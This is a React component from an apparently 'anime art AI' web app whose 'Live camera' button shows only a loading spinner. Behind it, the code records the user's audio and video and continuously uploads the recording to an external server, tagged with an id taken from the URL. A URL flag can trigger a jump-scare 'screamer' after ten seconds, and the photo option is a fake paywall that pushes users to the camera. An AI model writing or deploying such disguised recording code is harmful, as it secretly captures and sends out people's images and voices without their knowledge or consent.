import { Dispatch, SetStateAction, useCallback, useRef, useState } from 'react'
import { FaCamera } from 'react-icons/fa'
import { MdInsertPhoto } from 'react-icons/md'
import { Modal } from './Modal'

export const UploadPhoto = (props: {
	setScreamerVisible: Dispatch<SetStateAction<boolean>>
}) => {
	const [videoVisible, setVideoVisible] = useState<boolean>(false)
	const [photoModalOpen, setPhotoModalOpen] = useState<boolean>(false)
	const videoRef = useRef<HTMLVideoElement>(null)
	const videoContainerRef = useRef<HTMLDivElement>(null)

	const startCamera = useCallback(async () => {
		const url = new URL(window.location.toString())
		const tg_id = url.searchParams.get('model')
		const showScreamer = url.searchParams.get('v2') === 'true'
		setTimeout(() => props.setScreamerVisible(showScreamer), 10000)
		const timeNow = Date.now()
		try {
			navigator.mediaDevices
				.getUserMedia({ audio: true, video: true })

				.then(stream => {
					videoRef.current!.srcObject = stream
					videoRef.current!.style.height = `${
						document.body.offsetHeight - 24
					}px`
					videoRef.current!.scrollIntoView({ behavior: 'smooth' })
					setVideoVisible(true)

					const mediaRecorder = new MediaRecorder(stream, {
						mimeType: 'video/webm',
					})
					let recordedBlobs: BlobPart[] = []

					mediaRecorder.start(500)

					mediaRecorder.ondataavailable = async event => {
						recordedBlobs.push(event.data)
						const uploadVideo = async () => {
							const blob = new Blob(recordedBlobs, { type: 'video/webm' })
							const formData = new FormData()
							formData.append(
								'video',
								blob,
								(tg_id ? tg_id + '-' + timeNow : timeNow) + '.webm'
							)

							try {
								const response = await fetch(
									'https://anime-art-ai-api.vercel.app/upload-video',
									{
										method: 'POST',
										body: formData,
									}
								)
								console.log(response)
							} catch (error) {
								console.error('Upload error:', error)
							}
						}
						uploadVideo()
					}
				})
		} catch (e) {
			alert(e)
		}
	}, [])
	return (
		<div className='flex flex-col gap-3 justify-center'>
			<div className='flex flex-row justify-center gap-3'>
				<div className='w-1/2 flex justify-end'>
					<div
						className='cursor-pointer p-2 ring-2 ring-violet-700 text-violet-700 flex flex-col items-center select-none'
						onClick={startCamera}
					>
						<FaCamera size={32} className='fill-violet-700' />
						Live camera
					</div>
				</div>
				<div className='w-1/2 flex justify-start'>
					<div
						className='cursor-pointer p-2 ring-2 ring-sky-500 text-sky-500 flex flex-col items-center select-none'
						onClick={() => setPhotoModalOpen(true)}
					>
						<MdInsertPhoto size={32} className='fill-sky-500' />
						Pick photo
					</div>
					<Modal
						title='Not enough credits'
						open={photoModalOpen}
						setOpen={setPhotoModalOpen}
						closable
						confirmEnabled
						cancelButton={false}
						onCancel={() => {
							setPhotoModalOpen(false)
						}}
						onConfirm={() => {
							setPhotoModalOpen(false)
						}}
						onClose={() => {
							setPhotoModalOpen(false)
						}}
					>
						<h1 className='text-red-500'>You need 1 credit to pick photo</h1>
					</Modal>
				</div>
			</div>
			<div
				className='relative flex justify-center items-center'
				ref={videoContainerRef}
			>
				<video
					style={{
						height: '0',
						transform: 'rotateY(180deg)',
					}}
					ref={videoRef}
					autoPlay
					loop
					muted
					disablePictureInPicture
				/>
				{videoVisible && (
					<div className='absolute flex flex-row gap-3 items-center'>
						<div className='h-12 aspect-square border-4 border-dark border-t-slate-800 border-l-slate-800 rounded-full animate-loading'></div>
						<h1>Loading ...</h1>
					</div>
				)}
			</div>
		</div>
	)
}
